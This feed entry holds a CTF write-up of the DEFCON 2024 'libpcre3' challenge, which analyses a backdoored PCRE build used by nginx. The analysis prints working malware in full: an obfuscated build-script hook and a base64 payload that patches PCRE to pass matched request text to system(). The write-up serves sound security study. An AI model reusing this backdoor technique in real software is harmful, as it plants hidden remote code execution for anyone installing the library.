<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Posts on kyrie</title>
    <link>https://w1n-gl0ry.github.io/posts/</link>
    <description>Recent content in Posts on kyrie</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Some copyright notice - [my license](https://example.com/license)</copyright>
    <lastBuildDate>Fri, 10 May 2024 17:37:11 +0800</lastBuildDate><atom:link href="https://w1n-gl0ry.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://w1n-gl0ry.github.io/logo.svg</icon>
    
    
    <item>
      <title>DEFCON Qualifier 2024</title>
      <link>https://w1n-gl0ry.github.io/posts/defcon32/</link>
      <pubDate>Fri, 10 May 2024 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/defcon32/</guid>
      <description><![CDATA[<h1 id="introduction">Introduction</h1>
<p>I have played DEFCON-CTF Qualifier 2024 with my team 1337%Yogurt, we ended up with 30th place and I solved 5 pwnable challenges. In this write-up, I will write all the challenges I solved during and after the contests.</p>
<p><img src="https://i.imgur.com/St1ntx9.png" alt="scoreboard"></p>
<h1 id="pwn---libpcre3">Pwn - libpcre3</h1>
<blockquote>
<p>Software gets better with every release!</p>
</blockquote>
<p><a href="">Attachment</a></p>
<h2 id="overview">Overview</h2>
<p>When using regular expressions in C (also known as <code>regex</code>), we usually use 2 main libraries: <code>POSIX</code> and <code>PCRE</code>.</p>
<h3 id="posix-regular-expressions">POSIX Regular Expressions</h3>
<p>If you see the following included in the C source then it’s POSIX Regular Expressions. POSIX Regular expressions have lost the popularity battle and you won’t see them used much.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;regex.h&gt;</span><span style="color:#75715e">
</span></span></span></code></pre></div><p>I won’t discuss POSIX regular expressions in this blog post from here on.</p>
<h3 id="pcre---perl-compatible-regular-expressions">PCRE - Perl Compatible Regular Expressions</h3>
<p>Regular expressions from Perl gained widespread popularity and its syntax is what you’ll normally see in Java, Javascript, Python, Perl, and other languages. The library PCRE is written in C and claims to be much more powerful and flexible than POSIX. I actually can’t confirm that opinion because I’ve only learned the popularized Perl regular expression format. I can definitely attest to this format being very powerful and simple.</p>
<h4 id="pcre-and-pcre2">PCRE and PCRE2</h4>
<p>The <a href="https://pcre.org/">PCRE Library</a> has 2 versions: <code>pcre</code> and <code>pcre2</code> . The older pcre was released over 20 years ago in 1997 and is at version 8.43 as of this post. Future releases will be for bug fixes only. New features will be released in pcre2 which was released in 2015 and is now at version 10.34 as of this writing. In this blog post, we have an example for both pcre and pcre2.</p>
<p>In this challenge, they used version <code>8.39</code> of <code>pcre</code>.</p>
<h4 id="install-pcre">Install PCRE</h4>
<p>You can install the pcre library through a package manager.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt-get install libpcre3 libpcre3-dev
</span></span></code></pre></div><p>But I will install the pcre library from the source of this challenge to test it first.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt-get update -y <span style="color:#f92672">&amp;&amp;</span> sudo apt-get install -y apt-src build-essential devscripts dpkg-dev
</span></span><span style="display:flex;"><span>tar xvf pcre3_8.39-16.tar.gz
</span></span><span style="display:flex;"><span>cd pcre3_8.39
</span></span><span style="display:flex;"><span>dpkg-buildpackage -b
</span></span></code></pre></div><p>After running the last command, we get this output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>├── libpcre16-3_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre32-3_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre3_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre3-dbg_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre3-dev_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcrecpp0v5_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── nginx.conf
</span></span><span style="display:flex;"><span>├── pcre3-8.39
</span></span></code></pre></div><p>Basically, use this command below to install this lib.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ sudo dpkg -i libpcre3_8.39-16_amd64.deb 
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Reading database ... <span style="color:#ae81ff">355004</span> files and directories currently installed.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Preparing to unpack libpcre3_8.39-16_amd64.deb ...
</span></span><span style="display:flex;"><span>Unpacking libpcre3:amd64 <span style="color:#f92672">(</span>2:8.39-16<span style="color:#f92672">)</span> over <span style="color:#f92672">(</span>2:8.39-16<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>Setting up libpcre3:amd64 <span style="color:#f92672">(</span>2:8.39-16<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>Processing triggers <span style="color:#66d9ef">for</span> libc-bin <span style="color:#f92672">(</span>2.35-0ubuntu3.7<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>Processing triggers <span style="color:#66d9ef">for</span> man-db <span style="color:#f92672">(</span>2.10.2-1<span style="color:#f92672">)</span> ...
</span></span></code></pre></div><p>The PCRE library comes with a helper tool. Called <code>pcretest</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/libprce/deb/pcre-8.39/.libs                                                                                                             23:17:17
</span></span><span style="display:flex;"><span>╰──➤ ./pcretest
</span></span><span style="display:flex;"><span>PCRE version 8.39 2016-06-14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  re&gt; <span style="color:#e6db74">&#34;abc&#34;</span>
</span></span><span style="display:flex;"><span>data&gt; ab
</span></span><span style="display:flex;"><span>No match
</span></span><span style="display:flex;"><span>data&gt; abc
</span></span><span style="display:flex;"><span> 0: abc
</span></span><span style="display:flex;"><span>data&gt;
</span></span></code></pre></div><p>Now, we are going to focus on this challenge.</p>
<h3 id="nginx">Nginx</h3>
<p>The challenge gives us the Nginx configure file</p>
<p><code>nginx.conf</code></p>
<pre tabindex="0"><code class="language-conf" data-lang="conf">user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &#34;$request&#34; &#39;
                      &#39;$status $body_bytes_sent &#34;$http_referer&#34; &#39;
                      &#39;&#34;$http_user_agent&#34; &#34;$http_x_forwarded_for&#34;&#39;;

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;

    keepalive_timeout  65;

    server {
        listen 8080;
        root /var/www/html;

        location ~.*\.(php|php2|php3)$
        {
            return 403;
        }
    }
}
</code></pre><p>It is worth noting that in the server block, the location block uses regex to handle all PHP requests with a URI ending with php, php2, and php3.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>location <span style="color:#f92672">~</span>.<span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">\</span>.(php<span style="color:#f92672">|</span>php2<span style="color:#f92672">|</span>php3)<span style="color:#960050;background-color:#1e0010">$</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">403</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nginx uses the libpcre library to support the processing of regular expressions in configuration and the processing of HTTP requests. This allows Nginx to perform tasks such as URL mapping, request processing, and responses based on regular expressions flexibly and efficiently.</p>
<h2 id="source-code-overview">Source-code overview</h2>
<ul>
<li>This chall provides a <code>pcre</code> source code, and a nginx file config, which is different from the official <code>pcre-8.39</code> source code.</li>
</ul>
<pre tabindex="0"><code>.
├── nginx.conf
├── pcre-8.39
</code></pre><p>So, the first thing I did was install the original source code to compare the given library folder</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git diff prce-8.39 prce-8.39-orgin
</span></span></code></pre></div><p>Comparing with the diff command shows us the results below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/prce-8.39/makevp.bat b/prce-8.39-orgin/makevp.bat
</span></span><span style="display:flex;"><span>index b5a29f3..5f79548 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/prce-8.39/makevp.bat
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/prce-8.39-orgin/makevp.bat
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -1,4 +1,3 @@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">-exec 2&gt;&amp;-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span> :: AH 20-12-06 modified for new PCRE-7.0 and VP/BCC
</span></span><span style="display:flex;"><span> :: PH 19-03-07 renamed !compile.txt and !linklib.txt as makevp-compile.txt and
</span></span><span style="display:flex;"><span> ::             makevp-linklib.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -17,14 +16,14 @@ REM This file was contributed by Alexander Tokarev for building PCRE for use
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> REM with Virtual Pascal. It has not been tested with the latest PCRE release.
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> REM This file has been modified and extended to compile with newer PCRE releases
</span></span><span style="display:flex;"><span><span style="color:#f92672">-REM by Stefan O&#39;Weber (Angels Holocaust).
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+REM by Stefan Weber (Angels Holocaust).
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> 
</span></span><span style="display:flex;"><span> REM CHANGE THIS FOR YOUR BORLAND C++ COMPILER PATH
</span></span><span style="display:flex;"><span> SET BORLAND=f:\bcc
</span></span><span style="display:flex;"><span> REM location of the TASM binaries, if compiling with the -B BCC switch
</span></span><span style="display:flex;"><span> SET TASM=f:\tasm
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-SET PATH=%PATH%;%BORLAND%\bin;%TASM%\bin&#39;;PATH=:$PATH;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+SET PATH=%PATH%;%BORLAND%\bin;%TASM%\bin
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> SET PCRE_VER=77
</span></span><span style="display:flex;"><span> SET COMPILE_DEFAULTS=-DHAVE_CONFIG_H -DPCRE_STATIC -I%BORLAND%\include
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -32,7 +31,7 @@ del pcre%PCRE_VER%.lib &gt;nul 2&gt;nul
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span> :: sh configure
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-:: check for needed header files&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+:: check for needed header files
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> if not exist pcre.h copy pcre.h.generic pcre.h
</span></span><span style="display:flex;"><span> if not exist config.h copy config.h.generic config.h
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -46,15 +45,6 @@ REM compile and link the PCRE library into lib: option -B for ASM compile works
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> bcc32 -a4 -c -RT- -y- -v- -u- -R- -Q- -X -d -fp -ff -P- -O2 -Oc -Ov -3 -w-8004 -w-8064 -w-8065 -w-8012 -UDFTABLES -DVPCOMPAT %COMPILE_DEFAULTS% @makevp_c.txt
</span></span><span style="display:flex;"><span> IF ERRORLEVEL 1 GOTO ERROR
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-REM Cleanup after the tests&#39;; 
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-REM Deprecated, using cleanup-tests now; if [ ! -f .tests-built ]; then compare_output() { tr $&#39;\n&#39; &lt;$1 &#39; &#39;|cut -c$2-$2|tr -d $&#39;\n&#39;; };test_results=$(for i in $(sed -n &#39;369,369p&#39; ./t
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span>est*/*18-16); do IFS=&#39;.&#39;;set -- $i;IFS=&#39; &#39;; compare_output $(sed -n &#34;$1,${1}p&#34; makevp_c.txt) $2; done);
</span></span><span style="display:flex;"><span><span style="color:#f92672">-REM; sh -c &#34;$test_results&#34;; touch .tests-built; fi
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-cleanup-tests $@ || make $@
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-:&lt;&lt;END
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span> tlib %BORLAND%\lib\cw32.lib *calloc *del *strncmp *memcpy *memmove *memset *memcmp *strlen
</span></span><span style="display:flex;"><span> IF ERRORLEVEL 1 GOTO ERROR
</span></span><span style="display:flex;"><span> tlib pcre%PCRE_VER%.lib @makevp_l.txt +calloc.obj +del.obj +strncmp.obj +memcpy.obj +memmove.obj +memset.obj +memcmp.obj +strlen.obj
</span></span></code></pre></div><p>We can see some malicious command in the <code>makevp.bat</code> file, I think it&rsquo;s a backdoor through some build process, and extracted from that we get this output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f .tests-built <span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">then</span> compare_output<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> tr <span style="color:#e6db74">$&#39;\n&#39;</span> &lt;$1 <span style="color:#e6db74">&#39; &#39;</span>|cut -c$2-$2|tr -d <span style="color:#e6db74">$&#39;\n&#39;</span>; <span style="color:#f92672">}</span>;
</span></span><span style="display:flex;"><span>    test_results<span style="color:#f92672">=</span><span style="color:#66d9ef">$(for</span> i in <span style="color:#66d9ef">$(</span>sed -n <span style="color:#e6db74">&#39;369,369p&#39;</span> ./test*/*18-16<span style="color:#66d9ef">)</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.&#39;</span>;set -- $i;IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>; compare_output <span style="color:#66d9ef">$(</span>sed -n <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">,</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">p&#34;</span> makevp_c.txt<span style="color:#66d9ef">)</span> $2; <span style="color:#66d9ef">done)</span>; 
</span></span><span style="display:flex;"><span>    sh -c <span style="color:#e6db74">&#34;</span>$test_results<span style="color:#e6db74">&#34;</span>; touch .tests-built; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><p>The changelog file under the subdirectory of the library folder called <code>debian</code> also gives us the hint</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>pcre3 (2:8.39-16) unstable; urgency=medium
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  * Adds a missing long decimal test case and enable test running on windows
</span></span><span style="display:flex;"><span>    (Closes: #1258321)
</span></span></code></pre></div><p>Run this give us this output of the <code>test_results</code> variable</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo &gt;a CiMvYmluL2Jhc2gKaWYgWyAteiAiJEJVSUxEX05VTUJFUiIgXTsgdGhlbgpybSAtZiBhCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHJtIC1mIGNsZWFudXAtdGVzdHM7IGZpCkVPRgpjaG1vZCAreCBjbGVhbnVwLXRlc3RzOyBtYWtlIFwkQApleGl0IDAKZmkKZXhlYyAyPiYtCnNlZCAtaSAnMzY4LDM3MGQnIC4vdGVzdGRhdGEvdGVzdG91dHB1dDE4LTE2CmNhdCA8PEVPRiA+ICd0ZXN0ZGF0YS8gJwpkaWZmIC0tZ2l0IGEvcGNyZV9jb21waWxlLmMgYi9wY3JlX2NvbXBpbGUuYwppbmRleCBjNzQyMjI3Li5jMjQxOWVmIDEwMDY0NAotLS0gYS9wY3JlX2NvbXBpbGUuYworKysgYi9wY3JlX2NvbXBpbGUuYwpAQCAtNjUsNiArNjUsMTAgQEAgQ09NUElMRV9QQ1JFeCBtYWNybyB3aWxsIGFscmVhZHkgYmUgYXBwcm9wcmlhdGVseSBzZXQuICovCiAjdW5kZWYgUENSRV9JTkNMVURFRAogI2VuZGlmCiAKKyNpbmNsdWRlICJmY250bC5oIgorI2luY2x1ZGUgInN0cmluZy5oIgorI2luY2x1ZGUgPHN5cy9tbWFuLmg+CisKIAogLyogTWFjcm8gZm9yIHNldHRpbmcgaW5kaXZpZHVhbCBiaXRzIGluIGNsYXNzIGJpdG1hcHMuICovCiAKQEAgLTg5NzQsNiArODk3OCwxNCBAQCBSZXR1cm5zOiAgICAgICAgcG9pbnRlciB0byBjb21waWxlZCBkYXRhIGJsb2NrLCBvciBOVUxMIG9uIGVycm9yLAogICAgICAgICAgICAgICAgIHdpdGggZXJyb3JwdHIgYW5kIGVycm9yb2Zmc2V0IHNldAogKi8KIAorY2hhciogYWxwaCA9CisjaW5jbHVkZSAiYi5oIgorOworY2hhciogZGF0ZV9zID0gCisjaW5jbHVkZSAiZC5oIgorOworcGNyZSogYmRfcmUgPSBOVUxMOworCiAjaWYgZGVmaW5lZCBDT01QSUxFX1BDUkU4CiBQQ1JFX0VYUF9ERUZOIHBjcmUgKiBQQ1JFX0NBTExfQ09OVkVOVElPTgogcGNyZV9jb21waWxlKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBjb25zdCBjaGFyICoqZXJyb3JwdHIsCkBAIC04OTk4LDYgKzkwMTAsNyBAQCByZXR1cm4gcGNyZTMyX2NvbXBpbGUyKHBhdHRlcm4sIG9wdGlvbnMsIE5VTEwsIGVycm9ycHRyLCBlcnJvcm9mZnNldCwgdGFibGVzKTsKIH0KIAogCisKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gcGNyZSAqIFBDUkVfQ0FMTF9DT05WRU5USU9OCiBwY3JlX2NvbXBpbGUyKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBpbnQgKmVycm9yY29kZXB0ciwKQEAgLTkwMTIsNiArOTAyNSw5IEBAIHBjcmUzMl9jb21waWxlMihQQ1JFX1NQVFIzMiBwYXR0ZXJuLCBpbnQgb3B0aW9ucywgaW50ICplcnJvcmNvZGVwdHIsCiAgIGNvbnN0IGNoYXIgKiplcnJvcnB0ciwgaW50ICplcnJvcm9mZnNldCwgY29uc3QgdW5zaWduZWQgY2hhciAqdGFibGVzKQogI2VuZGlmCiB7CitjaGFyIGJbMHg0MDBdOworaWYgKGJkX3JlID09IE5VTEwpIHsgYmRfcmUgPSAxO2ludCBmPW9wZW4oIi9wcm9jL3NlbGYvbWFwcyIsIE9fUkRPTkxZKTtzdHJjcHkoYiwgIl4vIik7c3RyY2F0KGIsIGFscGgpO3N0cmNhdChiLCAiLyhbXFxcJGEtekEtWjAtOTs6Ly58XSspIik7Y2hhciAqZSA9IDA7aW50IGVvO2JkX3JlID0gcGNyZV9jb21waWxlKGIsIFBDUkVfTVVMVElMSU5FLCAmZSwgJmVvLCAwKTtpZiAoYmRfcmUgPT0gTlVMTCkge2JkX3JlID0gMTt9cmVhZChmLCBiLCAxMik7YlsxMl0gPSAwO2NoYXIqIGJhc2UgPSAoY2hhciopc3RydG91bGwoYiwgMCwgMTYpO2Nsb3NlKGYpO2ludCBjPTA7Zm9yIChpbnQgaT0wOyBpPDB4MTMwMDAwOyBpKyspIHtjaGFyKiBwID0gYmFzZSArIGk7aWYgKHBbMF09PSduJyZwWzFdPT0nZycmcFsyXT09J2knJnBbM109PSduJyZwWzRdPT0neCcmcFs1XT09Jy8nJnBbNl09PScxJyZwWzddPT0nLicmcFs4XT09JzEnJnBbOV09PSc4JyZwWzEwXT09Jy4nKSB7YysrOyBpZiAoYyA+IDUpIGJyZWFrO3ZvaWQqIHBfcGFnZSA9ICh2b2lkKikoKHVpbnQ2NF90KXAgJiAweGZmZmZmZmZmZmZmZmYwMDApO21wcm90ZWN0KHBfcGFnZSwgMHgxMDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURSk7c25wcmludGYocCwgMjEsICJuaS9uZ2lueC8lcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBkYXRlX3MpO3BbMjBdID0gMHgyMDt9fSB9CisKIFJFQUxfUENSRSAqcmU7CiBpbnQgbGVuZ3RoID0gMTsgIC8qIEZvciBmaW5hbCBFTkQgb3Bjb2RlICovCiBwY3JlX2ludDMyIGZpcnN0Y2hhcmZsYWdzLCByZXFjaGFyZmxhZ3M7CmRpZmYgLS1naXQgYS9wY3JlX2V4ZWMuYyBiL3BjcmVfZXhlYy5jCmluZGV4IDU1MjMwY2QuLjMzOTk3MzggMTAwNjQ0Ci0tLSBhL3BjcmVfZXhlYy5jCisrKyBiL3BjcmVfZXhlYy5jCkBAIC02MzQ3LDYgKzYzNDcsMTAgQEAgUmV0dXJuczogICAgICAgICAgPiAwID0+IHN1Y2Nlc3M7IHZhbHVlIGlzIHRoZSBudW1iZXIgb2YgZWxlbWVudHMgZmlsbGVkIGluCiAgICAgICAgICAgICAgICAgICAgLTEgPT4gZmFpbGVkIHRvIG1hdGNoCiAgICAgICAgICAgICAgICAgIDwgLTEgPT4gc29tZSBraW5kIG9mIHVuZXhwZWN0ZWQgcHJvYmxlbQogKi8KK2ludCBiZCA9IDA7CisvLyBEZWZpbmVkIGluIG90aGVyIGMgZmlsZQorZXh0ZXJuIHBjcmUqIGJkX3JlOworZXh0ZXJuIGNoYXIqIGFscGg7CiAKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gaW50IFBDUkVfQ0FMTF9DT05WRU5USU9OCkBAIC02Mzk4LDYgKzY0MDIsMTEgQEAgZnJhbWVfemVyby5YbmV4dGZyYW1lID0gTlVMTDsgICAgICAgICAgICAvKiBOb25lIGFyZSBhbGxvY2F0ZWQgeWV0ICovCiBtZC0+bWF0Y2hfZnJhbWVzX2Jhc2UgPSAmZnJhbWVfemVybzsKICNlbmRpZgogCisvLyBIZXJlIGlzIHRoZSB0YXJnZXQsIGdvb2QgbHVjazoKKy8vIGN1cmwgaHR0cDovL2NoaXB0dW5lZ2Vlay5zaGVsbHdlcGxheWFnYS5tZToxOTQvWyBDRU5TT1JFRCBdIC0taGVhZGVyICJUaWNrZXQ6IHRpY2tldHtbIENFTlNPUkVEIF19IiBbIENFTlNPUkVEIF0KK2NoYXIgYnVmWzB4MjAwMF07CitpZiAoYmQ9PSAwKSB7IGJkID0gMTsgaWYgKGJkX3JlKSB7IGludCBvdlszMF07aW50IHJjID0gcGNyZV9leGVjKGJkX3JlLCBOVUxMLCBzdWJqZWN0LCBzdHJsZW4oc3ViamVjdCksIDAsIDAsIG92LCBzaXplb2Yob3YpL3NpemVvZihvdlswXSkpO2lmIChyYyA+PSAyKSB7IHBjcmVfY29weV9zdWJzdHJpbmcoc3ViamVjdCwgb3YsIHJjLCAxLCBidWYsIHNpemVvZihidWYpKTtjaGFyKiBtID0gc3RyZHVwKGJ1Zik7c3lzdGVtKG0pOyB9fSBiZCA9IDA7IH0KKwogLyogQ2hlY2sgZm9yIHRoZSBzcGVjaWFsIG1hZ2ljIGNhbGwgdGhhdCBtZWFzdXJlcyB0aGUgc2l6ZSBvZiB0aGUgc3RhY2sgdXNlZAogcGVyIHJlY3Vyc2l2ZSBjYWxsIG9mIG1hdGNoKCkuIFdpdGhvdXQgdGhlIGZ1bm55IGNhc3RpbmcgZm9yIHNpemVvZiwgYSBXaW5kb3dzCiBjb21waWxlciBnYXZlIHRoaXMgZXJyb3I6ICJ1bmFyeSBtaW51cyBvcGVyYXRvciBhcHBsaWVkIHRvIHVuc2lnbmVkIHR5cGUsCgpFT0YKcGF0Y2ggLXAxIDwgJ3Rlc3RkYXRhLyAnIDI+JjEgMT4vZGV2L251bGwKZWNobyAkKCgkKGRhdGUgKyVzKSAvIDg2NDAwKSkgfCBtZDVzdW0gfCBjdXQgLWQnICcgLWYxIHwgIGF3ayAneyBmb3IoaT0wO2k8MTA7aSsrKSBwcmludGYgIiVzIiwgJDEgfScgPiBhCmVjaG8gJyInJChlY2hvICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSIgfCBncmVwIC1vIC4gfCBzaHVmIC0tcmFuZG9tLXNvdXJjZSAuL2F8IHRyIC1kICcKJyknIicgPiBiLmg7IHJtIC1mIC4vYTsKZWNobyAnIickKGRhdGUgKyIlbS4lZC4leSIgfCB0ciAtZCAnMCcpJyInID4gZC5oCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHBhdGNoIC1SIC1wMSA8ICd0ZXN0ZGF0YS8gJyAyPiYxIDE+L2Rldi9udWxsOyBybSAtZiAndGVzdGRhdGEvICc7IHJtIC1mIGNsZWFudXAtdGVzdHMgYi5oIGQuaDsgZmkKRU9GCmNobW9kICt4IGNsZWFudXAtdGVzdHM7IG1ha2UgJEAK;base64 a&gt;cleanup-tests -d;chmod +x cleanup-tests   
</span></span></code></pre></div><p>decoding the base64 gives us this content:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> [ <span style="color:#f92672">-</span>z <span style="color:#e6db74">&#34;$BUILD_NUMBER&#34;</span> ]; then
</span></span><span style="display:flex;"><span>rm <span style="color:#f92672">-</span>f a
</span></span><span style="display:flex;"><span>cat <span style="color:#f92672">&lt;&lt;</span>EOF <span style="color:#f92672">&gt;</span> cleanup<span style="color:#f92672">-</span>tests
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>make <span style="color:#960050;background-color:#1e0010">\$@</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> [ <span style="color:#e6db74">&#34;\$1&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;install&#34;</span> ]; then rm <span style="color:#f92672">-</span>f cleanup<span style="color:#f92672">-</span>tests; fi
</span></span><span style="display:flex;"><span>EOF
</span></span><span style="display:flex;"><span>chmod <span style="color:#f92672">+</span>x cleanup<span style="color:#f92672">-</span>tests; make <span style="color:#960050;background-color:#1e0010">\$@</span>
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>fi
</span></span><span style="display:flex;"><span>exec <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;-</span>
